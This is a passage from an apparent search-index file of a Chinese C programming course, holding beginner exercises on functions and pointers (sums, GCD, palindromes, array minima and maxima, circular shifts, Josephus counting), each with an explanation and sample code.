\u51fd\u6570\u8ba1\u7b97\u5947\u6570\u548c\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint even(int n);\nint OddSum(int N, int List[]);\n\nint main() {\n    int N;\n\n    // \u8f93\u5165\u6574\u6570\u7684\u4e2a\u6570\n    scanf(\"%d\", &amp;N);\n\n    int List[N];\n\n    // \u8f93\u5165\u6574\u6570\u5217\u8868\n    for (int i = 0; i &lt; N; i++) {\n        scanf(\"%d\", &amp;List[i]);\n    }\n\n    // \u8c03\u7528\u51fd\u6570\u8ba1\u7b97\u5947\u6570\u548c\n    int result = OddSum(N, List);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"Sum of (\");\n    for (int i = 0; i &lt; N; i++) {\n        if (even(List[i]) == 0) {\n            printf(\" %d\", List[i]);\n            if (i &lt; N - 1) {\n                printf(\" \");\n            }\n        }\n    }\n    printf(\") = %d\\n\", result);\n\n    return 0;\n}\n\n// \u5224\u65ad\u5947\u5076\u6027\u7684\u51fd\u6570\nint even(int n) {\n    return n % 2 == 0 ? 1 : 0;\n}\n\n// \u8ba1\u7b97\u5947\u6570\u548c\u7684\u51fd\u6570\nint OddSum(int N, int List[]) {\n    int sum = 0;\n    for (int i = 0; i &lt; N; i++) {\n        if (even(List[i]) == 0) {\n            sum += List[i];\n        }\n    }\n    return sum;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#49","title":"49","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>sign</code> \u51fd\u6570\u7528\u4e8e\u8ba1\u7b97\u7b26\u53f7\u51fd\u6570\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u4e00\u4e2a\u6574\u6570\uff0c\u7136\u540e\u8c03\u7528 <code>sign</code> \u51fd\u6570\u8ba1\u7b97\u7b26\u53f7\u51fd\u6570\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint sign(int x);\n\nint main() {\n    int x;\n\n    // \u8f93\u5165\u6574\u6570\n    scanf(\"%d\", &amp;x);\n\n    // \u8c03\u7528\u51fd\u6570\u8ba1\u7b97\u7b26\u53f7\u51fd\u6570\n    int result = sign(x);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"sign(%d) = %d\\n\", x, result);\n\n    return 0;\n}\n\n// \u8ba1\u7b97\u7b26\u53f7\u51fd\u6570\u7684\u51fd\u6570\nint sign(int x) {\n    if (x &gt; 0) {\n        return 1;\n    }\n    else if (x == 0) {\n        return 0;\n    }\n    else {\n        return -1;\n    }\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#50","title":"50","text":"<p>\u5728\u4ee3\u7801\u4e2d\uff0c<code>printNumberPyramid</code>\u51fd\u6570\u7528\u4e8e\u6253\u5370\u6570\u5b57\u91d1\u5b57\u5854\u3002\u901a\u8fc7\u5d4c\u5957\u7684\u5faa\u73af\uff0c\u5916\u5c42\u5faa\u73af\u63a7\u5236\u884c\u6570\uff0c\u5185\u5c42\u5faa\u73af\u5206\u522b\u6253\u5370\u6bcf\u4e00\u884c\u7684\u7a7a\u683c\u548c\u6570\u5b57\u3002\u5916\u5c42\u5faa\u73af\u7684\u53d8\u91cf<code>i</code>\u8868\u793a\u5f53\u524d\u884c\u6570\uff0c\u5185\u5c42\u5faa\u73af\u7684\u53d8\u91cf<code>j</code>\u8868\u793a\u5f53\u524d\u884c\u7684\u6570\u5b57\u4e2a\u6570\u3002</p> <p>\u5728<code>main</code>\u51fd\u6570\u4e2d\uff0c\u9996\u5148\u8f93\u5165\u91d1\u5b57\u5854\u7684\u5c42\u6570<code>n</code>\uff0c\u7136\u540e\u8c03\u7528<code>printNumberPyramid</code>\u51fd\u6570\u6253\u5370\u6570\u5b57\u91d1\u5b57\u5854\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\nvoid printNumberPyramid(int n) {\n    for (int i = 1; i &lt;= n; i++) {\n        // \u6253\u5370\u6bcf\u4e00\u884c\u7684\u7a7a\u683c\n        for (int j = 1; j &lt;= n - i; j++) {\n            printf(\" \");\n        }\n\n        // \u6253\u5370\u6bcf\u4e00\u884c\u7684\u6570\u5b57\n        for (int j = 1; j &lt;= i; j++) {\n            printf(\"%d \", i);\n        }\n\n        printf(\"\\n\");\n    }\n}\n\nint main() {\n    int n;\n    scanf(\"%d\", &amp;n);\n\n    printNumberPyramid(n);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#51","title":"51","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u4e24\u4e2a\u6574\u6570\uff0c\u7136\u540e\u8c03\u7528 <code>max</code> \u51fd\u6570\u627e\u5230\u8f83\u5927\u7684\u6570\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint max(int a, int b);\n\nint main() {\n    int a, b;\n\n    // \u8f93\u5165\u4e24\u4e2a\u6574\u6570\n    scanf(\"%d %d\", &amp;a, &amp;b);\n\n    // \u8c03\u7528 max \u51fd\u6570\u627e\u5230\u8f83\u5927\u7684\u6570\n    int result = max(a, b);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"max = %d\\n\", result);\n\n    return 0;\n}\n\n// \u627e\u4e24\u4e2a\u6570\u4e2d\u8f83\u5927\u8005\u7684\u51fd\u6570\nint max(int a, int b) {\n    return (a &gt; b) ? a : b;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#52","title":"52","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u4e24\u4e2a\u6574\u6570 m \u548c n\uff08\u786e\u4fdd m &lt; n\uff09\uff0c\u7136\u540e\u8c03\u7528 <code>sumBetween</code> \u51fd\u6570\u8ba1\u7b97 m \u5230 n \u4e4b\u95f4\u6240\u6709\u6574\u6570\u7684\u548c\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint sumBetween(int m, int n);\n\nint main() {\n    int m, n;\n\n    // \u8f93\u5165\u4e24\u4e2a\u6574\u6570\n    scanf(\"%d %d\", &amp;m, &amp;n);\n\n    // \u8c03\u7528 sumBetween \u51fd\u6570\u8ba1\u7b97\u548c\n    int result = sumBetween(m, n);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"sum = %d\\n\", result);\n\n    return 0;\n}\n\n// \u6c42 m \u5230 n \u4e4b\u548c\u7684\u51fd\u6570\nint sumBetween(int m, int n) {\n    int sum = 0;\n\n    for (int i = m; i &lt;= n; ++i) {\n        sum += i;\n    }\n\n    return sum;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#53","title":"53","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u4e24\u4e2a\u6574\u6570\uff0c\u7136\u540e\u8c03\u7528 <code>common_divisor</code> \u51fd\u6570\u8ba1\u7b97\u5b83\u4eec\u7684\u6700\u5927\u516c\u7ea6\u6570\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint common_divisor(int number1, int number2);\n\nint main() {\n    int number1, number2;\n\n    // \u8f93\u5165\u4e24\u4e2a\u6574\u6570\n    scanf(\"%d %d\", &amp;number1, &amp;number2);\n\n    // \u8c03\u7528 common_divisor \u51fd\u6570\u8ba1\u7b97\u6700\u5927\u516c\u7ea6\u6570\n    int result = common_divisor(number1, number2);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"%d\\n\", result);\n\n    return 0;\n}\n\n// \u8ba1\u7b97\u4e24\u6570\u7684\u6700\u5927\u516c\u7ea6\u6570\u7684\u51fd\u6570\nint common_divisor(int number1, int number2) {\n    int temp;\n\n    // \u8f97\u8f6c\u76f8\u9664\u6cd5\u8ba1\u7b97\u6700\u5927\u516c\u7ea6\u6570\n    while (number2 != 0) {\n        temp = number2;\n        number2 = number1 % number2;\n        number1 = temp;\n    }\n\n    return number1;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#54","title":"54","text":"<p>\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u4e00\u4e2a\u6574\u6570\uff0c\u7136\u540e\u8c03\u7528 <code>sum_of_series</code> \u51fd\u6570\u8ba1\u7b97\u4ece 1 \u5230\u8f93\u5165\u6574\u6570\u7684\u7acb\u65b9\u548c\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint sum_of_series(int number);\n\nint main() {\n    int number;\n\n    // \u8f93\u5165\u6574\u6570\n    scanf(\"%d\", &amp;number);\n\n    // \u8c03\u7528 sum_of_series \u51fd\u6570\u8ba1\u7b97\u7acb\u65b9\u548c\n    int result = sum_of_series(number);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"%d\\n\", result);\n\n    return 0;\n}\n\n// \u8ba1\u7b97 n \u4e2a\u81ea\u7136\u6570\u7684\u7acb\u65b9\u548c\u7684\u51fd\u6570\nint sum_of_series(int number) {\n    int sum = 0;\n\n    // \u8ba1\u7b97\u7acb\u65b9\u548c\n    for (int i = 1; i &lt;= number; i++) {\n        sum += i * i * i;\n    }\n\n    return sum;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/","title":"Alpha \u6307\u9488","text":""},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#1","title":"1","text":"<p>\u6c42\u4e8c\u7ef4\u6570\u7ec4\u4e2d\u7684\u6700\u5927\u503c\u3001\u6700\u5c0f\u503c\u53ca\u6240\u5728\u7684\u4e0b\u6807</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u6c423\u884c4\u5217\u4e8c\u7ef4\u6570\u7ec4\u4e2d\u7684\u6700\u5927\u503c\u3001\u6700\u5c0f\u503c\u53ca\u6240\u5728\u7684\u4e0b\u6807\u3002\u6240\u6709\u8f93\u5165\u8f93\u51fa\u5728\u4e3b\u51fd\u6570\u4e2d\u5b8c\u6210\uff0c\u4f7f\u7528\u51fd\u6570\u6307\u9488\u4f5c\u4e3a\u51fd\u6570\u53c2\u6570\u8c03\u7528\u6c42\u6700\u5927\u503c\u3001\u6700\u5c0f\u503c\u7684\u529f\u80fd\u51fd\u6570\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#define  M  3\n#define  N  4\nvoid fmax(int a[][N],int *l,int *r) {\n    int i,j;\n    for(i=0; i&lt;M; i++)\n        for(j=0; j&lt;N; j++)\n            if(a[i][j]&gt;a[*l][*r]) {\n                *l=i;\n                *r=j;\n            }\n}\nvoid fmin(int a[][N],int *l,int *r) {\n    int i,j;\n    for(i=0; i&lt;M; i++)\n        for(j=0; j&lt;N; j++)\n            if(a[i][j]&lt;a[*l][*r]) {\n                *l=i;\n                *r=j;\n            }\n}\nvoid pro(int a[][N],int *l,int *r,void (*f)(int [][N],int *,int *)) {\n    f(a,l,r);\n}\nint main( ) {\n    int a[M][N],i,j,line=0,row=0;\n    printf(\"\u8bf7\u8f93\u5165\u4e00\u4e2a%d\u884c%d\u5217\u7684\u6570\u7ec4\uff1a\",M,N);\n    for(i=0; i&lt;M; i++)\n        for(j=0; j&lt;N; j++)\n            scanf(\"%d\",&amp;a[i][j]);\n    pro(a,&amp;line,&amp;row,fmax);\n    printf(\"\u6700\u5927\u503c=%d,\u5176\u4e0b\u6807\u4e3a%d %d\\n\",a[line][row],line,row);\n    pro(a,&amp;line,&amp;row,fmin);\n    printf(\"\u6700\u5c0f\u503c=%d,\u5176\u4e0b\u6807\u4e3a%d %d\\n\",a[line][row],line,row);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#2","title":"2","text":"<p>\u6c42\u4e8c\u7ef4\u6570\u7ec4\u4e2d\u7684\u6700\u5927\u503c\u548c\u5176\u5730\u5740</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u8bbe\u8ba1\u4e00\u4e2a\u51fd\u6570\uff0c\u627e\u51fa3\u884c3\u5217\u7684\u4e8c\u7ef4\u6570\u7ec4\u4e2d\u7684\u6700\u5927\u503c\u548c\u5176\u5730\u5740\uff0c\u901a\u8fc7\u5f62\u53c2\u4f20\u56de\u6700\u5927\u503c\uff0c\u800c\u6700\u5927\u503c\u7684\u5730\u5740\u7531\u8be5\u51fd\u6570return\u8bed\u53e5\u8fd4\u56de\u3002\u5728\u4e3b\u51fd\u6570\u4e2d\u8f93\u51fa\u6570\u7ec4\u9996\u5740\u3001\u6700\u5927\u503c\u548c\u5176\u5730\u5740\u3002</p> Text Only<pre><code>\u6570\u7ec4\u9996\u5740=0x7ffc9a9b1250,\u6700\u5927\u503c=423,\u5176\u5730\u5740=0x7ffc9a9b1258\n</code></pre> C<pre><code>#include &lt;stdio.h&gt;\n#define  N  3\n#define  M  3\nint *select(int a[N][M],int *n) {\n    int i,j,row=0, colum=0;\n    for(i=0; i&lt;N; i++)\n        for(j=0; j&lt;M; j++)\n            if(a[i][j]&gt;a[row][colum]) {\n                row=i;\n                colum=j;\n            }\n    *n=a[row][colum];\n    return a[0]+row*N+colum;\n}\nint main( ) {\n    int a[N][M]= {99,311,423,6,1,15,9,17,20},max,*p;\n    p=select(a,&amp;max);\n    printf(\"\u6570\u7ec4\u9996\u5740=%p,\u6700\u5927\u503c=%d,\u5176\u5730\u5740=%p\\n\",a[0],max,p);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#3","title":"3","text":"<p>\u5c06n\u4e2a\u6574\u6570\uff0c\u5faa\u73af\u540e\u79fbm\u4e2a\u4f4d\u7f6e</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u67098\u4e2a\u6574\u6570\uff0c\u4f7f\u524d\u9762\u5404\u6570\u987a\u5e8f\u5411\u540e\u79fb\u52a8m\u4e2a\u4f4d\u7f6e\uff0c\u6700\u540em\u4e2a\u6570\u53d8\u6210\u6700\u524d\u9762m\u4e2a\u6570\u3002\u5199\u4e00\u51fd\u6570\u5b9e\u73b0\u4e0a\u8ff0\u529f\u80fd\uff0c\u5728\u4e3b\u51fd\u6570\u4e2d\u8f93\u5165N\u4e2a\u6574\u6570\u548c\u8f93\u51fa\u8c03\u6574\u540e\u7684N\u4e2a\u6570\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\nvoid cyc(int *p,int n,int m);\n//\u5c06n\u4e2a\u6574\u6570\uff0c\u5faa\u73af\u540e\u79fbm\u4e2a\u4f4d\u7f6e\n#define N 8\nvoid cyc(int *p,int n,int m) {\n    int i,k,temp;\n    for(k=0; k&lt;m; k++) {    //\u5faa\u73af\u79fb\u4f4dm\u6b21\n        temp=*(p+n-1);  //\u6682\u5b58\u6700\u540e\u4e00\u4e2a\u5143\u7d20\uff0c\u7a7a\u51fa\u90a3\u4e2a\u4f4d\u7f6e\n        for(i=0; i&lt;n-1; i++)\n            *(p+n-i-1)=*(p+n-i-2);//\u4f9d\u6b21\u505a\uff1a\u7a7a\u51fa\u7684\u4f4d\u7f6e\u4fdd\u5b58\u524d\u4e00\u4e2a\u5143\u7d20\n        *p=temp;        //\u6700\u524d\u9762\u7684\u4f4d\u7f6e\u4fdd\u5b58\u6682\u5b58\u7684\u5143\u7d20----\u5faa\u73af\u79fb\u4f4d\u4e00\u6b21\n    }\n}\nint main() {\n    int n=N,m,a[N],*p=a,i;\n    printf(\"\u8bf7\u8f93\u5165%d\u4e2a\u6574\u6570:\",N);\n    for(i=0; i&lt;N; i++)\n        scanf(\"%d\",p+i);\n    printf(\"\u5411\u540e\u79fb\u52a8\u51e0\u4e2a\u4f4d\u7f6e?\");\n    scanf(\"%d\",&amp;m);\n    cyc(p,n,m);             //\u5faa\u73af\u540e\u79fb\n    printf(\"\u79fb\u52a8\u540e\u7684\u6570\u636e\u4e3a\uff1a\\n\");\n    for(i=0; i&lt;n; i++)\n        printf(\"%-4d\",*(p+i));\n    printf(\"\\n\");\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#4","title":"4","text":"<p>\u4f7f\u7528\u6307\u9488\u5224\u65ad\u56de\u6587\u6570</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u8bbe\u8ba1\u4e00\u4e2a\u51fd\u6570<code>int fun(char *p1)</code>\uff0c\u529f\u80fd\u662f\uff1a\u5224\u522b\u5b57\u7b26\u4e32str\u662f\u5426\u4e3a\u201c\u56de\u6587\u201d\uff0c\u82e5\u662f\u8fd4\u56de1\uff0c\u5426\u5219\u8fd4\u56de0\u3002\u4f8b\u5982\uff0c\u201c12321\u201d\u3001\u201cabcdcba\u201d\u662f\u56de\u6587\uff0c\u800c\u201c123\u201d\u3001\u201chello\u201d\u4e0d\u662f\u3002</p> C<pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\nint fun(char *p1) {\n    //\u5224\u65ad\u4e00\u4e2a\u5b57\u7b26\u4e32\u662f\u5426\u4e3a\u56de\u6587\n    int flag=1;\n    char *p2;\n    p2=p1+strlen(p1)-1;\n    while(p2&gt;p1)\n        if(*p2--!=*p1++) {\n            flag=0;\n            break;\n        }\n    return flag;\n}\nint main() {\n    char s[100];\n    int flag;\n    printf(\"\u8bf7\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32:\\n\");\n    gets(s);\n    flag=fun(s);\n    printf(\"%s\\n\",flag?\"1\":\"0\");\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#5","title":"5","text":"<p>\u5faa\u73af\u62a5\u6570</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u6709n\u4eba\u56f4\u6210\u4e00\u4e2a\u5706\u5708\uff0c\u5206\u522b\u7f16\u53f71~n\uff0c\u4ece\u7b2c1\u4eba\u5230m\u5faa\u73af\u62a5\u6570\uff0c\u51e1\u662f\u62a5\u5230m\u8005\u79bb\u5f00\u5706\u5708\uff0c\u6c42n\u4e2a\u4eba\u79bb\u5f00\u5706\u5708\u7684\u6b21\u5e8f\u3002</p> C<pre><code>#include&lt;stdio.h&gt;\nvoid fun(int *p,int n,int m) {\n    int i,j,k;\n    i=1;                    //\u5faa\u73af\u8ba1\u4eba\u6570\n    k=0;                //\u79bb\u5f00\u4eba\u6570\u8ba1\u6570\n    j=0;                    //\u62a5\u6570\u8ba1\u6570\n    while(k&lt;n) {\n        if(*(p+i)!=0)       //!=0\u8868\u793a\u6709\u4eba\n            j++;            //\u62a5\u6570\n        if( j==m) {     //\u62a5\u5230m\u8005\u79bb\u5f00\uff0c\u7f6e\u5176\u4e3a0\n            printf(\"%-5d\",*(p+i));\n            *(p+i)=0;\n            j=0;            //\u4e3a\u91cd\u65b0\u62a5\u6570\u7f6e\u521d\u503c\n            k++;            //\u79bb\u5f00\u8005\u8ba1\u6570\n        }\n        i++;\n        if(i==n+1)\n            i=1;\n    }\n}\nint main( ) {\n    int i,m,n,array[100],*p;\n    p=array;\n    printf(\"\u8bf7\u8f93\u5165\u4eba\u6570\u548c\u62a5\u6570:\\n\");\n    scanf(\"%d%d\",&amp;n,&amp;m);\n    for(i=1; i&lt;=n; i++)\n        *(p+i)=i;\n    printf(\"\u79bb\u5f00\u7684\u987a\u5e8f\u4e3a :\\n\");\n    fun(p,n,m);\n    printf(\"\\n\");\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#6","title":"6","text":"<p>\u627e\u51fa\u6570\u7ec4\u4e2d\u7684\u6700\u5c0f\u503c</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u6709\u4e00\u4e2a\u6570\u7ec4\uff0c\u5185\u653e10\u4e2a\u6574\u6570\uff0c\u8981\u6c42\u7f16\u5199\u51fd\u6570<code>int processor(int *p)</code>\u627e\u51fa\u6700\u5c0f\u7684\u6570\u548c\u5b83\u7684\u4e0b\u6807\uff0c\u7136\u540e\u628a\u5b83\u548c\u6570\u7ec4\u4e2d\u6700\u524d\u9762\u7684\u5143\u7d20\u8c03\u6362\uff0c\u4e0b\u6807\u8fd4\u56de\u7ed9\u4e3b\u51fd\u6570\u8f93\u51fa\uff0c\u539f\u59cb\u6570\u7ec4\u548c\u6539\u53d8\u540e\u7684\u6570\u7ec4\u7531<code>void output(int *p)</code>\u8f93\u51fa\u3002</p> Text Only<pre><code>\u6700\u5c0f\u6570\u7684\u4e0b\u6807\u4e3a\uff1a9\n\u6539\u53d8\u540e\u7684\u6570\u7ec4\u4e3a:\n   -1   13   45   10    8    9    7   30   21    0\n</code></pre> C<pre><code>#include&lt;stdio.h&gt;\n#define N 10\n//\u67e5\u627e\u6700\u5c0f\u6570\u53ca\u5176\u4e0b\u6807,\u5e76\u548c\u7b2c\u4e00\u4e2a\u6570\u4ea4\u6362\nint processor(int *p) {\n    int  *p1,i,j,data;\n    p1=p;\n    j=0;\n    for(i=1; i&lt;N; i++) {\n        if(*p1&gt;*(p+i)) {\n            p1=p+i;\n            j=i;\n        }\n    }\n    if(j!=0) {\n        data=*p;//\u5982\u679c\u7b2c\u4e00\u4e2a\u6570\u4e0d\u662f\u6700\u5c0f\u7684\uff0c\u5c06\u6700\u5c0f\u6570\u548c\u7b2c\u4e00\u4e2a\u6570\u4ea4\u6362\n        *p=*p1;\n        *p1=data;\n    }\n    return j;\n}\nvoid output(int *p) {\n    int i;\n    for(i=0; i&lt;N; i++) {\n        printf(\"%5d\",*p);\n        p++;\n    }\n    printf(\"\\n\");\n}\nint main() {\n    int array[N]= {0,13,45,10,8,9,7,30,21,-1};\n    int *p=array;\n    printf(\"\u539f\u59cb\u6570\u7ec4\u4e3a:\\n\");\n    output(p);\n    printf(\"\u6700\u5c0f\u6570\u7684\u4e0b\u6807\u4e3a\uff1a%d\\n\",processor(p));\n    printf(\"\u6539\u53d8\u540e\u7684\u6570\u7ec4\u4e3a:\\n\");\n    output(p);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#7","title":"7","text":"<p>\u6c42\u8f93\u516510\u4e2a\u6574\u6570\u4e2d\u7684\u6b63\u6570\u4e4b\u548c\u53ca\u4e2a\u6570</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u6c42\u8f93\u516510\u4e2a\u6574\u6570\u4e2d\u7684\u6b63\u6570\u4e4b\u548c\u53ca\u4e2a\u6570\u3002\u8981\u6c42\uff1a\u7f16\u5199\u4e00\u4e2a\u51fd\u6570\u5b8c\u6210\u8ba1\u7b97\u548c\u7edf\u8ba1\uff0c\u5728\u4e3b\u51fd\u6570\u4e2d\u5b8c\u6210\u6240\u6709\u7684\u8f93\u5165\u8f93\u51fa\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#define N 10\nvoid count(int a[],int *plus,int *sum) {\n    int i;\n    for(i=0; i&lt;N; i++) {\n        if (a[i]&gt;0) {\n            (*plus)++;\n            (*sum)+=a[i];\n        }\n    }\n}\nint main() {\n    int i,a[N],plus=0,sum=0;\n    printf(\"\u8bf7\u8f93\u5165%d\u4e2a\u6574\u6570\uff1a\",N);\n    for(i=0; i&lt;N; i++)\n        scanf(\"%d\",&amp;a[i]);\n    count(a,&amp;plus,&amp;sum);\n    printf(\"\u6b63\u6570\u6709%d\u4e2a\uff0c\u6b63\u6570\u4e4b\u548c\u4e3a:%d\\n\",plus,sum);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#8","title":"8","text":"<p>\u4f7f\u7528\u6307\u9488\u7edf\u8ba1\u5b57\u7b26\u4e32\u4e2d\u5404\u5b57\u7b26\u6570\u91cf</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u5206\u522b\u7edf\u8ba1\u5b57\u7b26\u4e32\u4e2d\u5927\u5199\u5b57\u6bcd\u3001\u5c0f\u5199\u5b57\u6bcd\u3001\u7a7a\u683c\u53ca\u6570\u5b57\u5b57\u7b26\u7684\u4e2a\u6570\u3002\u8981\u6c42\uff1a\u5728\u4e3b\u51fd\u6570\u4e2d\u5b8c\u6210\u5b57\u7b26\u4e32\u7684\u8f93\u5165\u53ca\u8f93\u51fa\u7edf\u8ba1\u7ed3\u679c\uff0c\u5728\u51fd\u6570<code>void count(char a[],int *upper,int *lower,int *space,int *digit)</code>\u4e2d\u5b9e\u73b0\u7edf\u8ba1\u3002\u8bf7\u6309\u7167\u5927\u5199\u5b57\u6bcd\u3001\u5c0f\u5199\u5b57\u6bcd\u3001\u7a7a\u683c\u53ca\u6570\u5b57\u7684\u987a\u5e8f\u8fdb\u884c\u7edf\u8ba1</p> C<pre><code>#include \"stdio.h\"\nvoid count(char a[],int *upper,int *lower,int *space,int *digit) {\n    int i;\n    for(i=0; a[i]!='\\0'; i++) {\n        if ('A'&lt;=a[i] &amp;&amp; a[i]&lt;='Z')\n            (*upper)++;      /*\u7edf\u8ba1\u5927\u5199\u5b57\u6bcd\u7684\u4e2a\u6570*/\n        else if ('a'&lt;=a[i] &amp;&amp; a[i]&lt;='z')\n            (*lower)++;      /*\u7edf\u8ba1\u5c0f\u5199\u5b57\u6bcd\u7684\u4e2a\u6570*/\n        else if ('0'&lt;=a[i] &amp;&amp; a[i]&lt;='9')\n            (*digit)++;      /*\u7edf\u8ba1\u6570\u5b57\u7684\u4e2a\u6570*/\n        else if (a[i]==' ')\n            (*space)++;      /*\u7edf\u8ba1\u7a7a\u683c\u7684\u4e2a\u6570*/\n    }\n}\nint main() {\n    char a[81];\n    int upper=0,lower=0, space=0,digit=0;\n    printf(\"\u8bf7\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff1a\");\n    gets(a);\n    count(a,&amp;upper,&amp;lower,&amp;space,&amp;digit);\n    printf(\"\u5927\u5199\u5b57\u6bcd\u3001\u5c0f\u5199\u5b57\u6bcd\u3001\u7a7a\u683c\u548c\u6570\u5b57\u7684\u4e2a\u6570\u5206\u522b\u4e3a\uff1a%d %d %d %d\\n\",upper,lower,space,digit);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#9","title":"9","text":"<p>\u4f7f\u7528\u6307\u9488\u5bf9\u4e24\u4e2a\u6574\u6570\u8fdb\u884c\u6392\u5e8f</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u8f93\u5165\u4e24\u4e2a\u6574\u6570\uff0c\u6309\u7531\u5927\u5230\u5c0f\u987a\u5e8f\u8f93\u51fa\u3002\u8981\u6c42\uff1a\u5728\u4e3b\u51fd\u6570\u4e2d\u5b8c\u6210\u6574\u6570\u7684\u8f93\u5165\u8f93\u51fa\uff0c\u5728\u51fd\u6570<code>void cmp(int *pmax,int *pmin)</code>\u4e2d\u5b9e\u73b0\u4e24\u4e2a\u6574\u6570\u7684\u6bd4\u8f83\u548c\u4ea4\u6362\u3002</p> C<pre><code>#include \"stdio.h\"\nvoid cmp(int *pmax,int *pmin) {\n    int t;\n    if(*pmin&gt;*pmax) {\n        t=*pmin;\n        *pmin=*pmax;\n        *pmax=t;\n    }\n}\nint main() {\n    int pmax,pmin;\n    printf(\"\u8bf7\u8f93\u5165\u4e24\u4e2a\u6574\u6570\uff1a\");\n    scanf(\"%d%d\",&amp;pmax,&amp;pmin);\n    cmp(&amp;pmax,&amp;pmin);\n    printf(\"\u6309\u5927\u5c0f\u987a\u5e8f\u8f93\u51fa\u7684\u4e24\u4e2a\u6574\u6570\u4e3a\uff1a%d %d\\n\",pmax,pmin);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#10","title":"10","text":"<p>\u4f7f\u7528\u6307\u9488\u7edf\u8ba1N\u9636\u65b9\u9635</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u6c42N\u9636\u65b9\u9635\u6240\u6709\u5143\u7d20\u4e4b\u548c\u3001\u4e3b\u5bf9\u89d2\u7ebf\u5143\u7d20\u4e4b\u548c\u3001\u6b21\u5bf9\u89d2\u7ebf\u5143\u7d20\u4e4b\u548c\u3002\u8981\u6c42\u8bbe\u8ba1\u4e00\u4e2a\u529f\u80fd\u83dc\u5355\uff0c\u7528\u6237\u6839\u636e\u83dc\u5355\u8fdb\u884c\u529f\u80fd\u9009\u62e9\uff0c\u7a0b\u5e8f\u6839\u636e\u7528\u6237\u7684\u9009\u62e9\u4f7f\u7528\u51fd\u6570\u6307\u9488\u4f5c\u4e3a\u51fd\u6570\u53c2\u6570\u8c03\u7528\u76f8\u5e94\u7684\u529f\u80fd\u51fd\u6570\u3002</p> C<pre><code>#include \"stdio.h\"\n//#include \"conio.h\"\n#include \"stdlib.h\"\n#define N 4\nvoid Sum(int a[][N])\n{\n    int i, j, sum = 0;\n    for (i = 0; i &lt; N; i++)\n        for (j = 0; j &lt; N; j++)\n            sum = sum + a[i][j];\n    